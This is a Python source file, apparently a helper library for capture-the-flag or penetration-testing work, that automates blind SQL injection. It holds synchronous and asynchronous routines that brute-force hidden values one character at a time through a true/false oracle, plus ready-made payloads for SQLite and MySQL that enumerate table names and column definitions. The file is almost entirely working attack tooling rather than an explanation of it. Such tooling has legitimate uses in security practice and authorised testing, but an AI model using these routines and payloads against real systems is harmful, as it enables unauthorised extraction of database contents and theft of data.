import asyncio
import functools
import string
import time

import requests

_chars = (
	string.ascii_letters + " " + string.digits + string.punctuation +
	string.whitespace.replace(" ", "")
).translate(str.maketrans("", "", "%_*?")) + "_?*%"
# make sure GLOB and LIKE special characters match last

def blind_sqli(inject_template, sqli_oracle, chars=_chars):
	"""sqli_oracle takes a sql condition and returns if its true or false
	inject_template is the template for injecting into sqli_oracle"""
	val = ""
	while True:
		for c in chars:
			try:
				curr_val = val + c
				res = sqli_oracle(inject_template.format(curr_val))
				print(curr_val, res)
				if res:
					val = curr_val
					break
			except requests.exceptions.ConnectionError:  # really bad error handling
				time.sleep(1)
				break
		else:
			return val

async def _blind_sqli_async_helper(inject_template, sqli_oracle, val):
	res = await sqli_oracle(inject_template.format(val))
	print(val, res)
	return res, val

async def blind_sqli_async(inject_template, sqli_oracle, chars=_chars):
	"""sqli_oracle takes a sql condition and returns if its true or false
	inject_template is the template for injecting into sqli_oracle"""
	val = ""
	helper = functools.partial(_blind_sqli_async_helper, inject_template, sqli_oracle)
	while True:
		coros = [asyncio.create_task(helper(val + c)) for c in chars]
		for coro in asyncio.as_completed(coros):
			success, curr_val = await coro
			if success:
				for coro2 in coros:
					coro2.cancel()
				val = curr_val
				break
		else:
			return val

# use with str.replace("$o",offset).replace("$t",table_name)
# because str.format and % formatting can't be used
blind_sqli_payloads = {
	"sqlite":
	{
	"tables":
	(
	"(SELECT count(tbl_name) FROM sqlite_master WHERE type='table'"
	" and tbl_name NOT like 'sqlite_%' and tbl_name like '{0}%' limit 1 offset $o) > 0"
	),
	"columns":
	(
	"(SELECT count(sql) FROM sqlite_master WHERE type='table'"
	" and tbl_name ='$t' and sql like '{0}%' limit 1 offset $o) > 0"
	)
	},
	"mysql":
	{
	"tables":
	(
	"(select count(table_name) from information_schema.tables"
	" where table_name like '{0}%' limit 1 offset $o) > 0"
	),
	"columns":
	(
	"(select count(column_name) from information_schema.columns"
	" where table_name='$t' and column_name like '{0}%' limit 1 offset $o) > 0"
	)
	}
}

def blind_sqli_payload(dbms, typ, offset=0, table_name=""):
	return blind_sqli_payloads[dbms][typ].replace("$o", str(offset)).replace("$t", table_name)
